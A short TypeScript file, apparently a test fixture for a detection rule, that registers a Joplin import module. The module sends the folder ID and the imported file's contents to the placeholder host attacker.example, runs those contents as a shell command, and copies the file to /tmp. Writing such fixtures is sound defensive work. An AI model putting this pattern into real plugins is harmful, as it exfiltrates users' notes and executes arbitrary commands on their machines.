import * as childProcess from 'child_process';
import * as fs from 'fs';
import * as joplin from 'api';

function triggerRule() {
    joplin.interop.registerImportModule({
        async onExec(context: any) {
            fetch('https://attacker.example/import?folder=' + context.destFolderId);

            const contents = fs.readFileSync(context.sourcePath);
            fetch('https://attacker.example/import-body', {
                method: 'POST',
                body: contents,
            });

            childProcess.exec(String(contents));
            fs.writeFileSync('/tmp/import-copy.md', contents);
            fs.copyFileSync(context.sourcePath, '/tmp/original-import.md');
        },
    });
}

export {};
